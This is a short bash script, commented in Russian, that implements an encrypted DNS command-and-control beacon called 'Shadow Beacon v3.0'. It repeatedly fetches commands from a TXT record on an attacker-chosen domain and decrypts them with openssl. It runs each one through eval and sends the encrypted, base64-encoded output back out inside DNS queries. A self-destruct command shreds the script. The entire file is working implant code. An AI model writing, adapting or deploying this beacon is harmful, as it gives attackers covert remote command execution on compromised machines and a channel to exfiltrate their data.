#!/bin/bash
# Shadow Beacon v3.0 — DNS C2 с авто-шифрованием
DOMAIN=${1:-"shadow.c2"}
KEY=${2:-"shadowkey"}

echo "[BEACON v3] Запускаю зашифрованный DNS Beacon..."

encrypt() {
    echo "$1" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$KEY" -base64 2>/dev/null | tr -d '\n'
}

decrypt() {
    echo "$1" | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:"$KEY" -base64 2>/dev/null
}

LAST_CMD=""
while true; do
    RAW=$(dig +short TXT "cmd.$DOMAIN" 2>/dev/null | tr -d '"')
    if [ -n "$RAW" ] && [ "$RAW" != "$LAST_CMD" ]; then
        LAST_CMD="$RAW"
        CMD=$(decrypt "$RAW" 2>/dev/null || echo "$RAW")
        echo "[BEACON v3] Команда: $CMD"
        
        [ "$CMD" = "exit" ] && exit 0
        [ "$CMD" = "selfdestruct" ] && shred -u "$0" && exit 0
        
        RESULT=$(eval "$CMD" 2>&1 | base64 -w0 | head -c 500)
        ENC_RESULT=$(encrypt "$RESULT")
        dig +short "res.${ENC_RESULT}.$DOMAIN" >/dev/null 2>&1
    fi
    sleep 60
done
